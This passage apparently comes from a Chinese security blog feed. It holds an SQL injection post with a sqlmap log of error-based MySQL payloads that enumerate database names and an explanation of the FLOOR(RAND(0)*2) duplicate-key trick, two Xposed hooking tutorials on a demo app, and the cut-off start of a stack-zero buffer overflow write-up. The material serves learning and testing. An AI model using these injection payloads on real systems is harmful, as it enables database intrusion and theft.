Windows</span><br><span class="line">	web application technology: Apache 2.4.23, PHP 5.2.17</span><br><span class="line">	back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">	[22:09:35] [INFO] fetching database names</span><br><span class="line">	[22:09:35] [DEBUG] searching for error chunk length...</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 7445 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x34,1024)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xlNW</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 6284 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x32,512)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EObM</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 1981 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x36,256)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iJmF</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 4432 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT REPEAT(0x34,54)),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UOzJ</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 8781 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZjQp</span><br><span class="line">	[22:09:35] [INFO] the SQL query used returns 4 entries</span><br><span class="line">	[22:09:35] [PAYLOAD] test&#x27; AND (SELECT 1538 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- enAv</span><br><span class="line">	[22:09:36] [INFO] retrieved: information_schema</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 2345 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Ozef</span><br><span class="line">	[22:09:36] [INFO] retrieved: mysql</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 4469 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 2,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zwdT</span><br><span class="line">	[22:09:36] [INFO] retrieved: performance_schema</span><br><span class="line">	[22:09:36] [PAYLOAD] test&#x27; AND (SELECT 2893 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 3,1),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IOqF</span><br><span class="line">	[22:09:36] [INFO] retrieved: test</span><br><span class="line">	[22:09:36] [DEBUG] performed 9 	queries in 0.62 seconds</span><br><span class="line">	available databases [4]:</span><br><span class="line">	[*] information_schema</span><br><span class="line">	[*] mysql</span><br><span class="line">	[*] performance_schema</span><br><span class="line">	[*] test</span><br></pre></td></tr></table></figure>

<p>##SQLMap的方式</p>
<p>提取SQLMap的注入语句，可发现如下关键注入方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> atable <span class="keyword">set</span> `email`<span class="operator">=</span><span class="string">&#x27;111&#x27;</span> <span class="keyword">where</span> `truename`<span class="operator">=</span><span class="string">&#x27;test&#x27;</span> </span><br><span class="line"><span class="keyword">AND</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="number">1538</span> <span class="keyword">FROM</span>(</span><br><span class="line">	<span class="keyword">SELECT</span> </span><br><span class="line">		<span class="built_in">COUNT</span>(<span class="operator">*</span>),</span><br><span class="line">		CONCAT(</span><br><span class="line">			<span class="number">0x71707a7171</span>,</span><br><span class="line">			(<span class="keyword">SELECT</span> MID(</span><br><span class="line">						(IFNULL(</span><br><span class="line">								<span class="built_in">CAST</span>(schema_name <span class="keyword">AS</span> <span class="type">CHAR</span>),<span class="number">0x20</span></span><br><span class="line">								)</span><br><span class="line">						),<span class="number">1</span>,<span class="number">54</span></span><br><span class="line">					) <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">			),</span><br><span class="line">			<span class="number">0x7176707671</span>,</span><br><span class="line">			<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)</span><br><span class="line">		)x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x</span><br><span class="line">	)a</span><br><span class="line">)<span class="comment">-- enAv&#x27;</span></span><br></pre></td></tr></table></figure>

<p>##产生错误的原因<br>当随机数种子为<code>0</code>的时候，表达式<code>FLOOR(RAND(0)*2)</code> 会返回如下结果:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)x <span class="keyword">FROM</span> information_schema.tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> x <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="operator">&lt;</span><span class="comment">-- error happens here</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>因为第三个值和第二个值重复，所以产生了错误. 只要行数<code>&gt;3</code>的表都可以作为<code>FROM</code>的表来用，不过<code>information_schema.tables</code>和<code>information_schema.plugins</code>较为常用。<br>其中，能够产生错误的两个必要条件是<code>count(*)</code>和<code>GROUP BY</code>语句，缺一不可。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>),<span class="built_in">FLOOR</span>(RAND(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)x <span class="keyword">FROM</span> information_schema.tables <span class="keyword">GROUP</span> <span class="keyword">BY</span> x;</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>sqli</category>
      </categories>
  </entry>
  <entry>
    <title>Xposed学习(2)_hook_test</title>
    <url>/uncategorized/Xposed%E5%AD%A6%E4%B9%A0-2-hook-test.html</url>
    <content><![CDATA[<h3 id="要hook的目标"><a href="#要hook的目标" class="headerlink" title="要hook的目标"></a>要hook的目标</h3><p>这是个frida教程的一个简单的apk.</p>
<p>URL: <a href="https://11x256.github.io/Frida-hooking-android-part-1/">https://11x256.github.io/Frida-hooking-android-part-1/</a></p>
<p>Apk的源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.a11x256.frida_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">my_activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_my_activity);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> x , <span class="type">int</span> y )</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;Sum&quot;</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们要Hook fun这个方法。</p>
<h3 id="新建类"><a href="#新建类" class="headerlink" title="新建类"></a>新建类</h3><p><img src="/images/pasted-3.png" alt="upload successful"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.michael.xposed_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.example.a11x256.frida_test&quot;</span>)) &#123;</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;com.example.a11x256.frida_test.my_activity&quot;</span>, lpparam.classLoader,<span class="string">&quot;fun&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    Log.e(<span class="string">&quot;Xposed&quot;</span>, <span class="string">&quot;Xposed Hooked&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配置xposed"><a href="#配置xposed" class="headerlink" title="配置xposed"></a>配置xposed</h3><p>在如下的目录中新建如图所示的文件夹与文件。</p>
<p><img src="/images/pasted-4.png" alt="upload successful"></p>
<p><code>xposed_init</code>中的内容为完整的实现hook的类名(前面为包名)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.example.michael.xposed_1.test </span><br></pre></td></tr></table></figure>

<h3 id="Build-APK"><a href="#Build-APK" class="headerlink" title="Build APK"></a>Build APK</h3><p>安装、运行frida-test（这就是要hook的apk），查看logcat。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">12-04 17:48:55.688 24664 24664 E Xposed  : Xposed Hooked</span><br><span class="line">12-04 17:48:55.688 24664 24664 D Sum     : 80</span><br><span class="line">12-04 17:48:56.503 21811 21827 D PhoneInterfaceManager: [PhoneIntfMgr] getDataEnabled: subId=2 phoneId=0</span><br><span class="line">12-04 17:48:56.504 21811 21827 D PhoneInterfaceManager: [PhoneIntfMgr] getDataEnabled: subId=2 retVal=false</span><br><span class="line">12-04 17:48:56.504 24040 24040 D TelephonyManager: getDataEnabled: retVal=false</span><br><span class="line">12-04 17:48:56.689 24664 24664 E Xposed  : Xposed Hooked</span><br><span class="line">12-04 17:48:56.690 24664 24664 D Sum     : 80</span><br><span class="line">12-04 17:48:56.854 22435 22840 I CheckinRequestBuilder: Classify the device as Phone.</span><br><span class="line">12-04 17:48:57.636 21811 22233 D PhoneInterfaceManager: [PhoneIntfMgr] getDataEnabled: subId=2 phoneId=0</span><br><span class="line">12-04 17:48:57.637 21811 22233 D PhoneInterfaceManager: [PhoneIntfMgr] getDataEnabled: subId=2 retVal=false</span><br><span class="line">12-04 17:48:57.640 24040 24040 D TelephonyManager: getDataEnabled: retVal=false</span><br><span class="line">12-04 17:48:57.690 24664 24664 E Xposed  : Xposed Hooked</span><br><span class="line">12-04 17:48:57.691 24664 24664 D Sum     : 80</span><br><span class="line">12-04 17:48:58.692 24664 24664 E Xposed  : Xposed Hooked</span><br><span class="line">12-04 17:48:58.694 24664 24664 D Sum     : 80</span><br><span class="line">12-04 17:48:58.768 21811 22246 D PhoneInterfaceManager: [PhoneIntfMgr] getDataEnabled: subId=2 phoneId=0</span><br><span class="line">12-04 17:48:58.770 21811 22246 D PhoneInterfaceManager: [PhoneIntfMgr] getDataEnabled: subId=2 retVal=false</span><br><span class="line">12-04 17:48:58.771 24040 24040 D TelephonyManager: getDataEnabled: retVal=false</span><br><span class="line">12-04 17:48:59.695 24664 24664 E Xposed  : Xposed Hooked</span><br><span class="line">12-04 17:48:59.696 24664 24664 D Sum     : 80</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/yhjoker/p/8653020.html">https://www.cnblogs.com/yhjoker/p/8653020.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>Xposed学习(1)_new_project</title>
    <url>/xposed/Xposed%E5%AD%A6%E4%B9%A0-1-new-project.html</url>
    <content><![CDATA[<h3 id="新建空的android项目，没有Activity"><a href="#新建空的android项目，没有Activity" class="headerlink" title="新建空的android项目，没有Activity"></a>新建空的android项目，没有Activity</h3><p>目录结构如下：</p>
<p><img src="/images/pasted-0.png" alt="upload successful"></p>
<h3 id="修改build-gradle文件"><a href="#修改build-gradle文件" class="headerlink" title="修改build.gradle文件"></a>修改<code>build.gradle</code>文件</h3><p><img src="/images/pasted-1.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apply plugin: &#x27;com.android.application&#x27;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion 28</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId &quot;com.example.michael.xposed_1&quot;</span><br><span class="line">        minSdkVersion 15</span><br><span class="line">        targetSdkVersion 28</span><br><span class="line">        versionCode 1</span><br><span class="line">        versionName &quot;1.0&quot;</span><br><span class="line">        testInstrumentationRunner &quot;android.support.test.runner.AndroidJUnitRunner&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled false</span><br><span class="line">            proguardFiles getDefaultProguardFile(&#x27;proguard-android.txt&#x27;), &#x27;proguard-rules.pro&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 下面这三行是新加的</span><br><span class="line">repositories &#123;</span><br><span class="line">    jcenter();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    implementation fileTree(dir: &#x27;libs&#x27;, include: [&#x27;*.jar&#x27;])</span><br><span class="line">    implementation &#x27;com.android.support:appcompat-v7:28.0.0&#x27;</span><br><span class="line">    testImplementation &#x27;junit:junit:4.12&#x27;</span><br><span class="line">    androidTestImplementation &#x27;com.android.support.test:runner:1.0.2&#x27;</span><br><span class="line">    androidTestImplementation &#x27;com.android.support.test.espresso:espresso-core:3.0.2&#x27;</span><br><span class="line">    # 下面这两行是新加的</span><br><span class="line">    compileOnly &#x27;de.robv.android.xposed:api:82&#x27;</span><br><span class="line">    compileOnly &#x27;de.robv.android.xposed:api:82:sources&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="修改AndroidManifest-xml"><a href="#修改AndroidManifest-xml" class="headerlink" title="修改AndroidManifest.xml"></a>修改AndroidManifest.xml</h3><p><img src="/images/pasted-5.png" alt="upload successful"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.michael.xposed_1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> &gt;</span>   <span class="comment">&lt;!--以前这里是application的闭合，要修改一下，在meta-data之后再闭合application--&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--增加三个meta-data--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:value</span>=<span class="string">&quot;82&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:value</span>=<span class="string">&quot;Xposed Hook Demo 1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span>  <span class="comment">&lt;!--闭合application--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Build-APK"><a href="#Build-APK" class="headerlink" title="Build APK"></a>Build APK</h3><p>这个时候就可以<code>build apk</code>了，但是我这出了个问题。因为之前配置了gradle的代理，所以还需要将代理删除。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~ [17:04:56]</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> .gradle</span> </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~/.gradle [17:04:59]</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x  11 michael  staff   352B Oct 30 11:16 caches</span><br><span class="line">drwxr-xr-x   7 michael  staff   224B Oct 30 11:16 daemon</span><br><span class="line">-rw-r--r--   1 michael  staff   863B Dec  4 16:55 gradle.properties</span><br><span class="line">drwxr-xr-x   5 michael  staff   160B Oct 30 10:55 native</span><br><span class="line">drwxr-xr-x   2 michael  staff    64B Aug 22 18:48 workers</span><br><span class="line">drwxr-xr-x   3 michael  staff    96B Aug 22 18:29 wrapper</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~/.gradle [17:05:00]</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">pwd</span></span></span><br><span class="line">/Users/michael/.gradle</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~/.gradle [17:05:03]</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> gradle.properties</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># For more details on how to configure your build environment visit</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://www.gradle.org/docs/current/userguide/build_environment.html</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Specifies the JVM arguments used for the daemon process.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The setting is particularly useful <span class="keyword">for</span> tweaking memory settings.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default value: -Xmx1024m -XX:MaxPermSize=256m</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">org.gradle.jvmargs=-Xmx2048m -XX:MaxPermSize=512m -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># When configured, Gradle will run in incubating parallel mode.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This option should only be used with decoupled projects. More details, visit</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://www.gradle.org/docs/current/userguide/multi_project_builds.html<span class="comment">#sec:decoupled_projects</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">org.gradle.parallel=<span class="literal">true</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Tue Dec 04 16:22:40 CST 2018</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemProp.http.proxyHost=127.0.0.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemProp.https.proxyPort=1080</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemProp.https.proxyHost=127.0.0.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemProp.http.proxyPort=1080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="查看安装的模块是否正确"><a href="#查看安装的模块是否正确" class="headerlink" title="查看安装的模块是否正确"></a>查看安装的模块是否正确</h3><p>Build APK之后，用adb install 安装到手机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">michael @ m0nst3r <span class="keyword">in</span> ~/study/xposed/xposed_1/app/build/outputs/apk/debug [16:56:42]</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">adb install app-debug.apk</span> </span><br><span class="line">app-debug.apk: 1 file pushed. 2.0 MB/s (1540691 bytes in 0.722s)</span><br><span class="line">	pkg: /data/local/tmp/app-debug.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure>

<p>如果已经安装在手机中的<code>xposed installer</code>能够成功识别我们刚刚编译的这个项目，就说明没有问题。下面就可以写代码了。<br><img src="/images/pasted-2.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>xposed</category>
      </categories>
      <tags>
        <tag>xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit.educatioin/stack zero</title>
    <url>/re/pwn/exploit-educatioin-stack-zero.html</url>
    <content><![CDATA[<h1 id="exploit-education-x2F-stack-zero"><a href="#exploit-education-x2F-stack-zero" class="headerlink" title="exploit.education&#x2F;stack-zero"></a>exploit.education&#x2F;stack-zero</h1><p>作为一个逆向、pwn的新手新新手，找个练习的平台还是不错的。最近在看 <code>liveOverFlow</code>的Youtube视频，发现了这个东西，感觉不错，跟着做一做，希望能够有所提升。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ol>
<li>在<code>https://exploit.education</code>网站下载<code>Phoenix </code>虚拟镜像</li>
<li>安装<code>qemu</code></li>
<li>解压镜像文件，执行其中的<code>boot-exploit-education-phoenix-amd64.sh</code></li>
<li>连接虚拟机： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh user@127.0.0.1 -p 2222</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>首先更新系统，更新<code>gdb gef</code>, 参考<code>https://github.com/hugsy/gef</code></p>
<p>在<code>/opt/phoenix/amd64</code>下面就是我们要解决的binary了，在<code>exploit.education</code>上面还有<a href="https://exploit.education/phoenix/stack-zero/">源码</a> ，来看下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * phoenix/stack-zero, by https://exploit.education</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The aim is to change the contents of the changeme variable.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Scientists have recently discovered a previously unknown species of</span></span><br><span class="line"><span class="comment"> * kangaroos, approximately in the middle of Western Australia. These</span></span><br><span class="line"><span class="comment"> * kangaroos are remarkable, as their insanely powerful hind legs give them</span></span><br><span class="line"><span class="comment"> * the ability to jump higher than a one story house (which is approximately</span></span><br><span class="line"><span class="comment"> * 15 feet, or 4.5 metres), simply because houses can&#x27;t can&#x27;t jump.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BANNER \</span></span><br><span class="line"><span class="meta">  <span class="string">&quot;Welcome to &quot;</span> LEVELNAME <span class="string">&quot;, brought to you by https://exploit.education&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> changeme;</span><br><span class="line">  &#125; locals;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span 